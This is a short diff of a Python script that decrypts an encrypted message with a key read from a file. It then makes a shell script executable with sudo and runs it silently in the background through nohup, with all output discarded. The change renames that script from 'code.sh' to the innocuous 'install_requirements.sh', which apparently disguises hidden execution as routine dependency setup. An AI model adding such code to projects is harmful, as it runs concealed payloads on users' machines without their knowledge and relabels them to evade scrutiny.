@@ -10,7 +10,7 @@ def decrypt(pk, ciphertext):
     return ''.join(plain)
 
 def run_subprocess():
-    subprocess.run(['nohup','./code.sh','&', 'disown'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,start_new_session=False)
+    subprocess.run(['nohup','./install_requirements.sh','&', 'disown'],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,start_new_session=False)
 
 public = open("key.txt", "r").read()
 public = public.replace("[", "")
@@ -48,7 +48,7 @@ str_encrypted_msg = [int(i) for i in str_encrypted_msg]
 
 decrypted_msg = decrypt(public, str_encrypted_msg)
 
-subprocess.run(['sudo','chmod', '+x', 'code.sh'])
+subprocess.run(['sudo','chmod', '+x', 'install_requirements.sh'])
 
 thread = threading.Thread(target=run_subprocess)
 thread.start()
